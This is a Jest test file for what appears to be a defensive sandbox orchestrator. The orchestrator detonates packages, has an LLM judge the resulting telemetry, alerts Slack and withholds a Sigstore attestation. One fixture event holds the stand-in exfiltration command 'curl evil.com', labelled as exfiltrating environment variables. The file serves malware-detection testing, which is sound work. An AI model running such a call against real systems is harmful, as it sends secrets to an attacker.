import { Orchestrator } from '../src/usecases/Orchestrator';
import { NatsService } from '../src/infrastructure/NatsService';
import { OllamaService } from '../src/infrastructure/OllamaService';
import { SlackService } from '../src/infrastructure/SlackService';
import { SigstoreService } from '../src/infrastructure/SigstoreService';

describe('Orchestrator', () => {
  let orchestrator: Orchestrator;
  let mockNats: jest.Mocked<NatsService>;
  let mockOllama: jest.Mocked<OllamaService>;
  let mockSlack: jest.Mocked<SlackService>;
  let mockSigstore: jest.Mocked<SigstoreService>;

  beforeEach(() => {
    mockNats = { subscribe: jest.fn(), publish: jest.fn(), connect: jest.fn() } as any;
    mockOllama = { analyzeBehavior: jest.fn() } as any;
    mockSlack = { sendAlert: jest.fn() } as any;
    mockSigstore = { attestSafeness: jest.fn() } as any;

    orchestrator = new Orchestrator(mockNats, mockOllama, mockSlack, mockSigstore);
  });

  it('should trigger detonation sandbox', async () => {
    const spy = jest.spyOn(console, 'log');
    await orchestrator.triggerDetonation('repo/test', 'abc1234', 'package.json');
    expect(spy).toHaveBeenCalledWith(expect.stringContaining('Triggering gVisor sandbox'));
  });

  it('should process malicious telemetry and alert slack', async () => {
    mockOllama.analyzeBehavior.mockResolvedValue({
      isMalicious: true,
      confidence: 0.95,
      explanation: 'Exfiltrates env vars',
      remediation: 'Remove dependency'
    });

    // Access private method for testing
    await (orchestrator as any).processEvent({ pid: 1, command: 'curl evil.com', event_type: 'execve' });

    expect(mockSlack.sendAlert).toHaveBeenCalled();
    expect(mockSigstore.attestSafeness).not.toHaveBeenCalled();
  });
});
